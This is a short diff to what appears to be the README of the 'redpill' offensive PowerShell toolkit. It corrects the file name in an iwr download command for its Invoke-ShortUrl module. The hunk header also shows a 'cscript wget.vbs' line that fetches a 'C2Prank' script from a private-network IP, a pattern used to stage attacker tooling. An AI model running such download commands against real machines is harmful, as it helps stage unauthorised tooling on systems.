@@ -61,7 +61,7 @@ cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
 |Invoke-ShortUrl|TinyUrl url generator|User Land|Dependencies: python3 (http.server)|
 
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Invoke-ShortUrl.ps1" -OutFile "Invoke-ShortUrl.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Invoke-shorturl.ps1" -OutFile "Invoke-ShortUrl.ps1"
 ```
 
 <br />
